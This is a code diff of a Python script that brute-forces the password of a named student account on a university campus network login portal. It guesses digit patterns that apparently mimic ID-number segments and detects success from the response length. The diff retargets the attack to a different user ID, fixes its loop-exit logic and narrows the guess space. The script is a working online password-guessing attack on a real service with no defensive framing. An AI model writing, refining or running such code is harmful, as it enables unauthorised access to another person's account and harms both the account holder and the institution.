@@ -4,7 +4,7 @@ import requests
 
 request_url = "http://w.nuaa.edu.cn/iPortal/action/doLogin.do"
 login_info = {
-                'username': '70204867',
+                'username': '70204838',
                 'password': '',
                 'saved': '1',
                 "from": '003cc944be32e25365428f2dd2adbbe2',
@@ -28,7 +28,7 @@ headers = {
 
 password_prefix = ['01', '02', '03', '04', '05', '06', '07', '08', '09']
 password_index = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
-password_male = ['1', '3', '5', '7']
+password_male = ['1', '3', '5', '7', '9']
 password_female = ['0', '2', '4', '6', '8']
 
 for prefix in range(10, 32):
@@ -41,22 +41,21 @@ for i in range(31):
         for k in range(10):
             for m in range(5):
                 for n in range(10):
-                    login_info['password'] = password_prefix[i]+password_index[j]+password_index[k]\
-                                              + password_male[m]+password_index[n]
+                    login_info['password'] = '27'+password_index[j]+password_index[k]\
+                                             +password_male[m]+password_index[n]
                     print login_info['password']
 
                     loginRequest = requests.post(request_url, data=login_info, headers=headers)
-
-                    if loginRequest.headers['content-length'] == '258':
-                        print "The password is " + login_info['password']+'0000000000'
+                    if loginRequest.headers['content-length'] >= '258':
+                        print "haha"
+                        print "The password is " + login_info['password']
                         exit_flag = 1
                         break
-                if exit:
+                if exit_flag:
                     break
-            if exit:
+            if exit_flag:
                 break
-        if exit:
+        if exit_flag:
             break
-    if exit:
+    if exit_flag:
         break
-
